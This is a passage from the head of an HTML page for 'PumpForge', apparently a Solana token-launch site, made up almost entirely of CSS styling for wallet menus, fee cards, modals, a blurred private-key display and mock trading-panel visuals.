<!doctype html>
<html lang="en">
    <head>
        <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>PumpForge - Create & Launch</title>
        <style>
            @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap");
            :root {
                --background-primary: #0a0a0a;
                --background-secondary: rgba(
                    24,
                    24,
                    27,
                    var(--tw-bg-opacity, 1)
                );
                --background-tertiary: #1a1a1a;
                --border-color: #2d2d2d;
                --border-color-light: #404040;
                --text-primary: rgba(255, 255, 255, var(--tw-text-opacity, 1));
                --text-secondary: #a0a0a0;
                --text-tertiary: #525252;
                --accent-green: #25c38e;
                --accent-green-hover: #1fa87a;
                --font-family: "Poppins", "Inter", sans-serif;
                --container-padding: 40px;
            }

            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
            }

            html,
            body {
                min-height: 100%;
            }

            body {
                font-family: var(--font-family);
                background-color: rgba(15, 15, 18, var(--tw-bg-opacity, 1));
                color: var(--text-primary);
                display: flex;
                flex-direction: column;
            }

            .icon {
                width: 20px;
                height: 20px;
                stroke: var(--text-secondary);
                fill: none;
                stroke-width: 1.5;
                stroke-linecap: round;
                stroke-linejoin: round;
                transition: stroke 0.2s ease;
            }

            .app-container {
                flex: 1;
                max-width: 1440px;
                width: 100%;
                margin: 0 auto;
                padding: 0 var(--container-padding);
            }
            /* Priority & Activity Modal Styles */
            .priority-options { display: flex; flex-direction: column; gap: 12px; }
            .priority-card {
                background: var(--background-primary);
                border: 1px solid var(--border-color);
                padding: 16px;
                border-radius: 8px;
                cursor: pointer;
                transition: all 0.2s ease;
            }
            .priority-card:hover { border-color: var(--text-secondary); }
            .priority-card.active {
                border-color: var(--accent-green);
                background: rgba(37, 195, 142, 0.05);
            }
            .prio-header { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 4px; }
            .prio-cost { color: var(--accent-green); font-size: 0.85rem; }
            .prio-desc { font-size: 0.85rem; color: var(--text-secondary); }

            .activity-item {
                padding: 16px 24px;
                border-bottom: 1px solid var(--border-color);
                display: flex;
                gap: 16px;
                align-items: flex-start;
            }
            .activity-item:last-child { border-bottom: none; }
            .activity-time { font-family: monospace; font-size: 0.75rem; color: var(--text-tertiary); min-width: 60px; }
            .activity-content h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 2px; }
            .activity-content p { font-size: 0.85rem; color: var(--text-secondary); }
            /* --- Styles for Header Balance Display --- */
            .user-menu-toggle {
                gap: 0; /* Remove default gap */
            }
            .wallet-info-header {
                display: flex;
                align-items: center;
                gap: 8px;
                padding-right: 12px;
            }
            .header-balance {
                display: none; /* Hidden by default, shown when connected */
                align-items: center;
                gap: 6px;
                font-weight: 600;
                color: var(--text-primary);
                padding-left: 12px;
                border-left: 1px solid var(--border-color);
            }
            .header-balance .icon {
                width: 14px;
                height: 14px;
                color: #9945ff; /* Solana gradient color */
            }
            .user-menu.connected .header-balance {
                display: flex; /* Show when wallet is connected */
            }

            /* --- FEES SECTION STYLES --- */

            .cost-breakdown {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 24px;
                margin: 40px 0;
            }

            .fee-card {
                background-color: var(--background-secondary);
                border: 1px solid var(--border-color);
                border-radius: 12px;
                padding: 32px;
                display: flex;
                flex-direction: column;
            }

            .fee-card.primary {
                border-color: rgba(37, 195, 142, 0.3);
            }

            .fee-header h3 {
                font-size: 1.2rem;
                font-weight: 600;
                color: var(--text-primary);
            }

            .fee-price {
                margin: 24px 0;
            }

            .fee-price span:first-child {
                display: block;
                font-size: 2.5rem;
                font-weight: 700;
                color: var(--accent-green);
            }

            .fee-price span:last-child {
                font-size: 1rem;
                font-weight: 500;
                color: var(--text-secondary);
            }

            .fee-description {
                font-size: 0.9rem;
                color: var(--text-secondary);
                line-height: 1.6;
                margin-bottom: 24px;
            }

            .fee-includes-list {
                list-style: none;
                margin-top: auto; /* Pushes to bottom */
                display: flex;
                flex-direction: column;
                gap: 16px;
            }

            .fee-includes-list li {
                display: flex;
                align-items: center;
                gap: 12px;
                font-size: 0.9rem;
                font-weight: 500;
            }

            .fee-includes-list .icon {
                width: 20px;
                height: 20px;
                stroke: var(--accent-green);
            }

            .pass-through-items {
                margin-top: 24px;
                display: flex;
                flex-direction: column;
                gap: 20px;
            }

            .fee-item {
                display: flex;
                justify-content: space-between;
                align-items: flex-start;
                padding-bottom: 20px;
                border-bottom: 1px solid var(--border-color);
            }
            .fee-item:last-child {
                border-bottom: none;
                padding-bottom: 0;
            }

            .fee-item h4 {
                font-weight: 600;
                margin-bottom: 4px;
            }

            .fee-item > div:first-child span {
                font-size: 0.85rem;
                color: var(--text-secondary);
            }

            .fee-item-price {
                text-align: right;
                flex-shrink: 0;
                margin-left: 16px;
            }

            .fee-item-price span:first-child {
                display: block;
                font-weight: 600;
                font-size: 1rem;
            }

            .fee-item-price span:last-child {
                font-size: 0.85rem;
                color: var(--text-secondary);
            }

            .total-cost-example {
                text-align: center;
                background-color: var(--background-secondary);
                border: 1px solid var(--border-color);
                padding: 24px;
                border-radius: 12px;
            }
            .total-cost-example h3 {
                margin-bottom: 8px;
            }

            @media (max-width: 900px) {
                .cost-breakdown {
                    grid-template-columns: 1fr;
                }
            }

            /* --- ABOUT SECTION STYLES --- */

            .about-grid {
                display: grid;
                grid-template-columns: 1fr 1fr; /* Two columns */
                gap: 24px;
                margin-bottom: 24px;
            }

            .about-card {
                background: linear-gradient(180deg, rgba(255,255,255,0.03) 0%, rgba(255,255,255,0.01) 100%);
                border: 1px solid var(--border-color);
                padding: 24px;
                border-radius: 12px;
                transition: transform 0.2s ease, border-color 0.2s ease;
            }

            .about-card:hover {
                transform: translateY(-2px);
                border-color: var(--accent-green);
            }

            .about-card .icon {
                width: 32px;
                height: 32px;
                stroke: var(--accent-green);
                margin-bottom: 16px;
            }

            .about-card h3 {
                font-size: 1.1rem;
                font-weight: 600;
                margin-bottom: 8px;
                color: var(--text-primary);
            }

            .about-card p {
                font-size: 0.9rem;
                color: var(--text-secondary);
                line-height: 1.6;
            }

            /* Ethics/Disclaimer Box */
            .ethics-box {
                background-color: rgba(235, 87, 87, 0.05); /* Very subtle red tint */
                border: 1px solid rgba(235, 87, 87, 0.2);
                border-radius: 12px;
                padding: 32px;
                margin-top: 32px;
            }

            .ethics-header {
                display: flex;
                align-items: center;
                gap: 12px;
                margin-bottom: 16px;
            }

            .ethics-header .icon {
                stroke: #e5484d; /* Red warning color */
            }

            .ethics-header h3 {
                font-size: 1.2rem;
                font-weight: 600;
                color: #ff6b6b;
            }

            .ethics-box p {
                color: var(--text-secondary);
                line-height: 1.6;
                margin-bottom: 12px;
                font-size: 0.95rem;
            }

            .ethics-footer {
                font-weight: 600;
                color: var(--text-primary) !important;
                margin-top: 16px;
                padding-top: 16px;
                border-top: 1px solid rgba(235, 87, 87, 0.2);
            }

            /* Mobile responsive for the grid */
            @media (max-width: 768px) {
                .about-grid {
                    grid-template-columns: 1fr; /* Stack on mobile */
                }
            }


            /* --- HOW IT WORKS SECTION STYLES --- */

            .steps-container {
                display: flex;
                flex-direction: column;
                gap: 60px;
                padding-bottom: 40px;
            }

            .step-card {
                display: flex;
                align-items: center;
                gap: 60px;
            }

            .step-card.reverse {
                flex-direction: row-reverse;
            }

            .step-text {
                flex: 1;
                position: relative;
            }

            .step-badge {
                display: inline-block;
                background-color: rgba(37, 195, 142, 0.1);
                color: var(--accent-green);
                font-weight: 700;
                font-size: 0.9rem;
                padding: 6px 12px;
                border-radius: 6px;
                margin-bottom: 16px;
                border: 1px solid rgba(37, 195, 142, 0.2);
            }

            .step-text h3 {
                font-size: 1.5rem;
                font-weight: 700;
                margin-bottom: 16px;
                color: var(--text-primary);
            }

            .step-text p {
                color: var(--text-secondary);
                line-height: 1.6;
                margin-bottom: 20px;
            }

            /* Strategy Tip Box */
            .strategy-tip {
                background-color: var(--background-secondary);
                border-left: 3px solid var(--accent-green);
                padding: 16px;
                border-radius: 0 8px 8px 0;
                font-size: 0.9rem;
                display: flex;
                gap: 12px;
                align-items: flex-start;
            }

            .strategy-tip .icon {
                flex-shrink: 0;
                stroke: var(--accent-green);
            }

            .strategy-list {
                list-style: none;
                margin-top: 16px;
            }

            .strategy-list li {
                margin-bottom: 12px;
                padding-left: 16px;
                border-left: 2px solid var(--border-color);
                color: var(--text-secondary);
                font-size: 0.9rem;
            }

            .strategy-list strong {
                color: var(--text-primary);
            }

            /* --- MOCK UI VISUALS (Pure CSS Images) --- */
            .step-visual {
                flex: 1;
                background: linear-gradient(145deg, #121215, #0a0a0a);
                border: 1px solid var(--border-color);
                border-radius: 16px;
                aspect-ratio: 16/9;
                display: flex;
                align-items: center;
                justify-content: center;
                position: relative;
                overflow: hidden;
                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            }

            /* Mock 1: Wallet */
            .mock-ui-header { position: absolute; top: 15px; left: 20px; right: 20px; display: flex; gap: 10px; align-items: center; }
            .mock-dot { width: 10px; height: 10px; border-radius: 50%; background: #333; }
            .mock-ui-body { text-align: center; }
            .mock-balance { font-size: 1.5rem; font-weight: 700; color: #fff; margin-bottom: 10px; }
            .mock-btn { background: var(--accent-green); padding: 6px 16px; border-radius: 4px; color: #000; font-size: 0.8rem; font-weight: 600; display: inline-block;}

            /* Mock 2: Uploader */
            .mock-uploader { width: 60%; height: 60%; border: 2px dashed #333; border-radius: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
            .mock-uploader .icon { width: 32px; height: 32px; stroke: #444; }

            /* Mock 3: Sliders */
            .mock-slider-group { width: 70%; display: flex; flex-direction: column; gap: 15px; }
            .mock-label-row { display: flex; justify-content: space-between; margin-bottom: 5px; }
            .mock-line { height: 6px; background: #333; border-radius: 3px; width: 40%; }
            .mock-val { height: 6px; background: #333; border-radius: 3px; width: 20%; }
            .mock-slider-track { height: 4px; background: #222; border-radius: 2px; position: relative; }
            .mock-slider-fill { position: absolute; left: 0; top: 0; bottom: 0; background: var(--accent-green); border-radius: 2px; }

            /* Mock 4: Chart */
            .mock-chart { display: flex; gap: 8px; align-items: flex-end; height: 50%; }
            .mock-candle { width: 12px; background: var(--accent-green); border-radius: 2px; }
            .c1 { height: 30%; opacity: 0.4; }
            .c2 { height: 45%; opacity: 0.6; }
            .c3 { height: 35%; opacity: 0.5; }
            .c4 { height: 60%; opacity: 0.8; }
            .c5 { height: 90%; background: #25c38e; box-shadow: 0 0 10px rgba(37,195,142,0.5); }

            /* --- Add this to the MOCK UI VISUALS section --- */

            /* Mock 5: Manual Control Panel */
            .mock-control-panel { 
                width: 70%; 
                display: flex; 
                flex-direction: column; 
                align-items: center; 
                padding: 20px; 
                background: #0F0F0F; 
                border-radius: 8px;
            }
            .mock-pump-btn {
                width: 80%;
                padding-top: 10px;
                padding-bottom: 10px;
                font-size: 1rem;
            }
            .mock-sell-group {
                display: flex;
                gap: 10px;
                width: 80%;
                margin-top: 20px;
                padding-top: 15px;
                border-top: 1px solid #222;
            }
            .mock-sell-btn {
                flex: 1;
                font-size: 0.7rem;
            }
            .mock-sell-btn.dev {
                background: #2a2a2d;
                color: #fff;
            }
            .mock-sell-btn.all {
                background: #e5484d;
                color: #fff;
            }


            /* Mobile Response */
            @media (max-width: 900px) {
                .step-card, .step-card.reverse {
                    flex-direction: column;
                    gap: 30px;
                }
                .step-visual {
                    width: 100%;
                    aspect-ratio: 2/1;
                }
            }


            /* --- Style for loading state on withdraw button --- */
            .modal-withdraw-btn:disabled {
                background-color: var(--background-tertiary);
                color: var(--text-tertiary);
                cursor: not-allowed;
            }

            .main-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 20px 0;
                border-bottom: 1px solid var(--border-color);
                margin-bottom: 40px;
            }
            .header-left {
                display: flex;
                align-items: center;
                gap: 40px;
            }
            .header-logo {
                font-size: 1.5rem;
                font-weight: 700;
                display: flex;
                align-items: center;
                gap: 12px;
                color: var(--text-primary);
                text-decoration: none;
            }
            /* Header Tagline Styles */
            /* --- Brand Column & Tagline Styles --- */
            /* --- Brand Identity Styles (Add/Replace) --- */
            .header-brand-container {
                display: flex;
                align-items: center;
                gap: 12px; /* Space between Icon and Text stack */
                text-decoration: none;
                cursor: pointer;
            }

            .logo-icon {
                width: 32px;
                height: 32px;
                stroke: var(--accent-green);
                flex-shrink: 0;
            }

            .brand-text-stack {
                display: flex;
                flex-direction: column;
                justify-content: center;
                line-height: 1.1; /* Tighter line height for the stack */
            }

            .brand-name {
                font-size: 1.5rem;
                font-weight: 700;
                color: var(--text-primary);
                letter-spacing: -0.5px;
            }

            .brand-tagline {
                font-size: 0.8rem;
                color: #cecece; /* Brighter gray for better readability */
                font-weight: 500;
                letter-spacing: 0.2px;
                margin-top: 7px;
            }

            /* Mobile: Scale down slightly but keep visible */
            @media (max-width: 768px) {
                .header-brand-container {
                    gap: 8px;
                }
                .brand-name {
                    font-size: 1.25rem;
                }
                .brand-tagline {
                    font-size: 0.7rem;
                }
                .logo-icon {
                    width: 28px;
                    height: 28px;
                }
            }

            /* Mobile Optimization: Scale down slightly to fit */
            @media (max-width: 768px) {
                .header-tagline {
                    font-size: 0.65rem;
                    white-space: normal; /* Allow wrapping if screen is tiny */
                    line-height: 1.2;
                    max-width: 220px;
                }
                
                .brand-column {
                    gap: 2px;
                }
            }

            .header-nav {
                display: flex;
                gap: 24px;
            }
            .header-nav a {
                color: var(--text-secondary);
                text-decoration: none;
                font-weight: 500;
                font-size: 0.95rem;
                transition: color 0.2s ease;
                position: relative;
                padding-bottom: 4px;
            }
            .header-nav a:hover {
                color: var(--text-primary);
            }
            .header-nav a.active-nav {
                color: var(--accent-green);
                font-weight: 600;
            }
            .header-nav a.active-nav::after {
                content: "";
                position: absolute;
                bottom: -23px;
                left: 0;
                right: 0;
                height: 2px;
                background-color: var(--accent-green);
            }
            /* Ensure the right side doesn't collapse incorrectly */
            .header-right {
                display: flex;
                align-items: center;
                gap: 12px;
                flex-shrink: 0;
            }

            .user-menu {
                position: relative;
            }
            .user-menu-toggle {
                display: flex;
                align-items: center;
                background-color: var(--background-secondary);
                padding: 8px 12px;
                border-radius: 8px;
                cursor: pointer;
                font-weight: 500;
                border: 1px solid var(--border-color);
                transition: background-color 0.2s ease;
            }
            .user-menu-toggle:hover {
                background-color: #202020;
            }
            .user-menu-toggle .icon {
                margin-right: 8px;
                stroke: var(--accent-green);
            }
            .status-dot {
                width: 8px;
                height: 8px;
                background-color: var(--text-tertiary);
                border-radius: 50%;
                margin-right: 8px;
                transition:
                    background-color 0.3s ease,
                    opacity 0.3s ease;
            }
            .user-menu.connected .user-menu-toggle .status-dot {
                background-color: var(--accent-green);
            }
            .user-menu .dropdown-arrow {
                stroke: var(--text-secondary);
                transition: transform 0.3s ease;
                margin-left: 8px;
            }
            .user-menu .user-menu-toggle.open .dropdown-arrow {
                transform: rotate(180deg);
            }

            /* --- REVISED PROFESSIONAL DROPDOWN STYLES --- */
            .wallet-dropdown {
                position: absolute;
                top: calc(100% + 14px);
                right: 0;
                width: 320px; /* Wider for pro feel */
                background-color: #121212; /* Darker, cleaner background */
                border: 1px solid var(--border-color);
                border-radius: 12px;
                z-index: 100;
                opacity: 0;
                visibility: hidden;
                transform: translateY(-10px);
                transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
                box-shadow: 0 16px 40px rgba(0, 0, 0, 0.4);
                overflow: hidden;
            }

            .wallet-dropdown.open {
                opacity: 1;
                visibility: visible;
                transform: translateY(0);
            }

            .dropdown-section {
                padding: 16px;
                border-bottom: 1px solid var(--border-color);
            }

            .dropdown-section:last-child {
                border-bottom: none;
                background-color: rgba(255, 255, 255, 0.02);
            }

            .wallet-header-row {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 8px;
            }

            .network-badge {
                display: flex;
                align-items: center;
                gap: 6px;
                background-color: rgba(37, 195, 142, 0.1);
                color: var(--accent-green);
                font-size: 0.75rem;
                font-weight: 600;
                padding: 4px 8px;
                border-radius: 20px;
                border: 1px solid rgba(37, 195, 142, 0.2);
            }

            .network-dot {
                width: 6px;
                height: 6px;
                background-color: var(--accent-green);
                border-radius: 50%;
                box-shadow: 0 0 8px rgba(37, 195, 142, 0.6);
            }

            .wallet-balance-large {
                font-size: 1.75rem;
                font-weight: 700;
                color: var(--text-primary);
                letter-spacing: -0.5px;
            }

            .wallet-actions-grid {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 8px;
                margin-top: 12px;
            }

            .action-btn-small {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
                background-color: var(--background-tertiary);
                border: 1px solid var(--border-color);
                color: var(--text-secondary);
                font-size: 0.85rem;
                font-weight: 500;
                padding: 8px;
                border-radius: 6px;
                cursor: pointer;
                transition: all 0.2s ease;
            }

            .action-btn-small:hover {
                background-color: #252525;
                color: var(--text-primary);
                border-color: var(--border-color-light);
            }

            .menu-item {
                display: flex;
                align-items: center;
                gap: 12px;
                padding: 12px;
                margin: 4px 0;
                border-radius: 8px;
                cursor: pointer;
                transition: background-color 0.2s ease;
                color: var(--text-secondary);
                font-size: 0.95rem;
                font-weight: 500;
            }

            .menu-item:hover {
                background-color: rgba(255, 255, 255, 0.05);
                color: var(--text-primary);
            }

            .menu-item .icon {
                stroke: var(--text-tertiary);
                transition: stroke 0.2s ease;
            }

            .menu-item:hover .icon {
                stroke: var(--text-primary);
            }

            .menu-item.danger:hover {
                background-color: rgba(229, 72, 77, 0.1);
                color: #ff6b6b;
            }
            .menu-item.danger:hover .icon {
                stroke: #ff6b6b;
            }

            /* Security Section specific */
/* --- FIX 1: Remove the old local feedback style --- */
/* Search for .copy-feedback and DELETE IT from your CSS. 
   We will use the global showToast() instead. */

            /* --- FIX 2: Refined Security Section Styles --- */
            .security-reveal {
                background-color: rgba(20, 20, 20, 0.6);
                border: 1px solid var(--border-color);
                border-radius: 8px;
                margin-top: 12px; /* More space from items above */
                overflow: hidden;
            }

            .security-header {
                display: flex;
                align-items: center;
                justify-content: space-between;
                padding: 12px 16px; /* Increased padding */
                cursor: pointer;
                background: #1a1a1a;
                transition: background-color 0.2s ease;
            }

            .security-header:hover {
                background: #202020;
            }

            .security-content {
                padding: 16px; /* More breathing room */
                border-top: 1px solid var(--border-color);
                background-color: #0a0a0a;
                display: none;
            }

            .security-label-text {
                font-size: 0.75rem; 
                color: var(--text-tertiary); 
                margin-bottom: 8px;
                display: block;
            }

            .pk-text-blur {
                font-family: "Courier New", Courier, monospace;
                font-size: 0.85rem;
                color: var(--text-secondary);
                background-color: rgba(255, 255, 255, 0.03); /* Subtle background */
                border: 1px dashed var(--border-color-light); /* Code-block look */
                padding: 12px;
                border-radius: 6px;
                word-break: break-all;
                line-height: 1.4;
                filter: blur(4px);
                transition: all 0.3s ease;
                cursor: pointer;
                user-select: none; /* Prevents accidental highlighting while blurred */
            }

            .pk-text-blur:hover {
                filter: blur(0);
                border-color: var(--accent-green);
                color: var(--text-primary);
                background-color: rgba(37, 195, 142, 0.05);
            }

            /* Fix the Disconnect button margin */
            .menu-item.danger {
                margin-top: 8px;
            }

            .withdraw-btn {
                background-color: var(--accent-green);
                color: #000;
                border: none;
                padding: 9px 16px;
                border-radius: 8px;
                font-weight: 600;
                cursor: pointer;
                transition: background-color 0.2s ease;
                display: none;
            }
            .withdraw-btn:hover {
                background-color: var(--accent-green-hover);
            }

            .modal-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0, 0, 0, 0.7);
                z-index: 1000;
                display: flex;
                align-items: center;
                justify-content: center;
                opacity: 0;
                visibility: hidden;
                transition:
                    opacity 0.3s ease,
                    visibility 0.3s;
            }
            .modal-overlay.open {
                opacity: 1;
                visibility: visible;
            }
            .modal-box {
                background-color: #18181b;
                border: 1px solid var(--border-color);
                border-radius: 12px;
                width: 90%;
                max-width: 420px;
                transform: scale(0.95);
                transition: transform 0.3s ease;
            }
            .modal-overlay.open .modal-box {
                transform: scale(1);
            }
            .modal-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 20px 24px;
                border-bottom: 1px solid var(--border-color);
            }
            .modal-header h2 {
                font-size: 1.25rem;
                font-weight: 600;
            }
            .modal-close-btn {
                background: none;
                border: none;
                cursor: pointer;
            }
            .modal-close-btn .icon {
                stroke: var(--text-secondary);
            }
            .modal-close-btn:hover .icon {
                stroke: var(--text-primary);
            }
            .modal-body {
                padding: 24px;
            }
            .modal-body .input-field {
                margin-bottom: 20px;
            }
            .modal-body .input-field:last-child {
                margin-bottom: 0;
            }
            .modal-body .input-with-button {
                position: relative;
            }
            .modal-body .input-with-button input {
                padding-right: 60px;
            }
            .modal-body .max-btn {
                position: absolute;
                right: 1px;
                top: 1px;
                bottom: 1px;
                background-color: var(--background-tertiary);
                border: 1px solid var(--border-color);
                color: var(--text-primary);
                font-weight: 600;
                padding: 0 12px;
                border-radius: 0 7px 7px 0;
                cursor: pointer;
                transition: background-color 0.2s ease;
            }
            .modal-body .max-btn:hover {
                background-color: #252525;
            }
            .modal-footer {
                padding: 0 24px 24px;
            }
            .modal-withdraw-btn {
                width: 100%;
                background-color: var(--accent-green);
                color: #000;
                font-size: 1rem;
                font-weight: 700;
                padding: 14px;
                border-radius: 8px;
                border: none;
                cursor: pointer;
                transition: background-color 0.2s ease;
            }
            .modal-withdraw-btn:hover {
                background-color: var(--accent-green-hover);
            }

            .select-coin-container {
                display: flex;
                align-items: center;
                background-color: transparent;
                border: 1px solid var(--border-color);
                border-radius: 8px;
                padding: 12px 14px;
            }
            .select-coin-container img {
                width: 24px;
                height: 24px;
                margin-right: 12px;
            }
            .select-coin-container span {
                font-weight: 500;
                font-size: 1rem;
            }

            /* --- Page Section --- */
            .page-section {
                display: none;
            }
            .page-section.active {
                display: block;
                animation: fadeIn 0.5s ease-in-out;
            }
            @keyframes fadeIn {
                from {
                    opacity: 0;
                }
                to {
                    opacity: 1;
                }
            }

            .form-container-wrapper {
                display: flex;
                gap: 40px;
                align-items: flex-start;
            }
            .form-container {
                flex: 2;
                min-width: 0;
            }
            .preview-container {
                flex: 1;
                position: sticky;
                top: 40px;
            }
            .page-header h1,
            .form-header h1 {
                font-size: 2rem;
                font-weight: 700;
                margin-bottom: 8px;
            }
            .page-header p,
            .form-header p {
                color: var(--text-secondary);
                margin-bottom: 30px;
                font-size: 1rem;
                line-height: 1.6;
                max-width: 700px;
            }

            .form-section {
                background: linear-gradient(
                    rgba(37, 195, 142, 0.05),
                    rgba(37, 195, 142, 0)
                );
                border: 1px solid rgba(37, 195, 142, 0.2);
                border-radius: 12px;
                padding: 24px;
                margin-bottom: 24px;
            }

            .form-section h2 {
                color: var(--accent-green);
                margin-bottom: 24px;
                font-size: 1.25rem;
                font-weight: 600;
            }

            .input-group {
                display: flex;
                gap: 20px;
            }
            .input-field {
                width: 100%;
                position: relative;
            }
            .input-field:not(:last-child) {
                margin-bottom: 24px;
            }
            .input-field label,
            .input-field .label {
                display: block;
                margin-bottom: 10px;
                font-weight: 500;
                font-size: 0.9rem;
            }
            .input-field .label-optional {
                color: var(--text-secondary);
                font-weight: 400;
                margin-left: 4px;
            }
            .input-field input,
            .input-field textarea {
                width: 100%;
                background-color: transparent;
                border: 1px solid var(--border-color);
                border-radius: 8px;
                padding: 12px 14px;
                color: var(--text-primary);
                font-size: 1rem;
                font-family: var(--font-family);
                transition: all 0.2s ease;
            }

            .input-field input:-webkit-autofill {
                -webkit-box-shadow: 0 0 0 30px var(--background-primary) inset !important;
                -webkit-text-fill-color: var(--text-primary) !important;
                transition: background-color 5000s ease-in-out 0s;
            }

            .input-field input:focus,
            .input-field textarea:focus {
                outline: none;
                border-color: var(--accent-green);
                box-shadow: 0 0 0 3px rgba(37, 195, 142, 0.2);
            }
            .input-field textarea {
                resize: vertical;
                min-height: 100px;
            }

            .dropdown-toggle {
                display: flex;
                align-items: center;
                gap: 10px;
                color: var(--text-primary);
                font-weight: 500;
                cursor: pointer;
                user-select: none;
                padding: 8px 0;
            }
            .dropdown-toggle:hover {
                color: var(--accent-green);
            }
            .dropdown-toggle:hover .icon {
                stroke: var(--accent-green);
            }
            .dropdown-toggle .arrow-down {
                margin-left: auto;
                transition: transform 0.3s ease;
            }
            .dropdown-toggle.open .arrow-down {
                transform: rotate(180deg);
            }

            .dropdown-content {
                overflow: hidden;
                max-height: 0;
                opacity: 0;
                transition:
                    max-height 0.5s ease-out,
                    opacity 0.5s ease-out,
                    margin-top 0.5s ease-out;
            }
            .dropdown-content.open {
                max-height: 1500px;
                opacity: 1;
                margin-top: 20px;
            }

            .uploader {
                border: 2px dashed var(--border-color);
                border-radius: 12px;
                text-align: center;
                cursor: pointer;
                transition: border-color 0.2s ease;
                position: relative;
                overflow: hidden;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                min-height: 300px;
                background-color: rgba(10, 10, 10, 0.5);
            }
            .uploader:hover,
            .uploader.dragover {
                border-color: var(--accent-green);
            }
            .uploader .uploader-content {
                padding: 32px;
            }
            .uploader .uploader-icon {
                margin: 0 auto 16px auto;
                width: 48px;
                height: 48px;
                stroke: var(--text-secondary);
            }
            .uploader p {
                font-weight: 500;
                margin-bottom: 16px;
                color: var(--text-secondary);
            }
            .uploader .select-file-btn {
                background-color: #1a1a1a;
                color: var(--text-primary);
                font-weight: 600;
                padding: 10px 20px;
                border: 1px solid var(--border-color);
                border-radius: 8px;
                cursor: pointer;
                transition: all 0.2s ease;
            }
            .uploader .select-file-btn:hover {
                background-color: #252525;
                border-color: var(--border-color-light);
            }
            .uploader input[type="file"] {
                display: none;
            }

            .media-preview-container {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 12px;
            }
            .media-preview {
                display: none;
                max-width: 100%;
                max-height: 100%;
                border-radius: 8px;
                object-fit: contain;
            }
            .replace-file-btn {
                position: absolute;
                bottom: 16px;
                right: 16px;
                background-color: rgba(10, 10, 10, 0.85);
                color: var(--text-primary);
                font-weight: 600;
                padding: 8px 16px;
                border: 1px solid var(--border-color);
                border-radius: 8px;
                cursor: pointer;
                transition: all 0.2s ease;
                display: none;
                z-index: 10;
            }
            .replace-file-btn:hover {
                background-color: #000;
                border-color: var(--text-secondary);
            }
            .uploader.has-file .replace-file-btn {
                display: block;
            }
            .uploader.has-file {
                cursor: default;
            }

            .file-info-container {
                display: flex;
                margin-top: 24px;
                font-size: 0.85rem;
                color: var(--text-secondary);
                gap: 24px;
            }
            .file-info {
                display: flex;
                align-items: flex-start;
                gap: 12px;
            }
            .file-info .icon {
                width: 24px;
                height: 24px;
                flex-shrink: 0;
                stroke: var(--text-tertiary);
            }
            .file-info h4 {
                font-weight: 500;
                color: var(--text-primary);
                margin-bottom: 4px;
            }
            .file-info ul {
                list-style: none;
            }

            .pump-btn-group {
                display: flex;
                gap: 8px;
            }
            .pump-btn-group .btn {
                flex: 1;
                background-color: var(--background-tertiary);
                border: 1px solid var(--border-color);
                color: var(--text-secondary);
                padding: 10px;
                border-radius: 6px;
                cursor: pointer;
                font-weight: 500;
                transition: all 0.2s ease;
                text-align: center;
            }
            .pump-btn-group .btn:hover {
                background-color: #252525;
                border-color: #404040;
            }
            .pump-btn-group .btn.active {
                background-color: var(--accent-green);
                border-color: var(--accent-green);
                color: #000;
                font-weight: 600;
            }

            .feature-description {
                color: var(--text-secondary);
                font-size: 0.85rem;
                font-weight: 400;
                margin-top: 8px;
                line-height: 1.4;
            }

            .adv-feature-module {
                background-color: transparent;
                border: 1px solid var(--border-color);
                border-radius: 8px;
                padding: 16px;
                margin-bottom: 16px;
            }
            .adv-feature-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            .adv-feature-header h4 {
                font-weight: 600;
                font-size: 1rem;
            }
            .adv-feature-content {
                padding-top: 16px;
                margin-top: 16px;
                border-top: 1px solid var(--border-color);
                transition: opacity 0.3s ease;
            }
            .adv-feature-module.disabled .adv-feature-content {
                opacity: 0.4;
                pointer-events: none;
            }
            .adv-feature-content .slider-field:last-child {
                margin-bottom: 0;
            }

            .ghost-protocol-sub-feature {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 12px 0;
                border-bottom: 1px solid var(--border-color);
            }
            .ghost-protocol-sub-feature:last-child {
                border-bottom: none;
                padding-bottom: 0;
            }
            .ghost-protocol-sub-feature:first-child {
                padding-top: 0;
            }
            .ghost-protocol-sub-feature .label {
                font-size: 0.9rem;
                color: var(--text-secondary);
            }

            .usd-value-display {
                display: block;
                text-align: right;
                font-size: 0.85rem;
                color: var(--text-secondary);
                margin-top: 8px;
                height: 1em; /* Prevents layout shifting */
                opacity: 0; /* Hidden by default */
                transition: opacity 0.3s ease;
            }

            .comment-toggle {
                grid-column: 1 / -1;
                display: flex;
                align-items: center;
                justify-content: space-between;
            }
            .switch {
                position: relative;
                display: inline-block;
                width: 44px;
                height: 24px;
                flex-shrink: 0;
            }
            .switch input {
                display: none;
            }
            .slider {
                position: absolute;
                cursor: pointer;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background-color: var(--border-color-light);
                transition: 0.4s;
                border-radius: 34px;
            }
            .slider:before {
                position: absolute;
                content: "";
                height: 18px;
                width: 18px;
                left: 3px;
                bottom: 3px;
                background-color: white;
                transition: 0.4s;
                border-radius: 50%;
            }
            input:checked + .slider {
                background-color: var(--accent-green);
            }
            input:checked + .slider:before {
                transform: translateX(20px);
            }

            #advanced-toggle {
                margin-top: 20px;
                border-top: 1px solid var(--border-color);
                padding-top: 20px;
            }
            #adv-status-dot {
                opacity: 0;
                margin-left: 8px;
                background-color: var(--accent-green);
            }
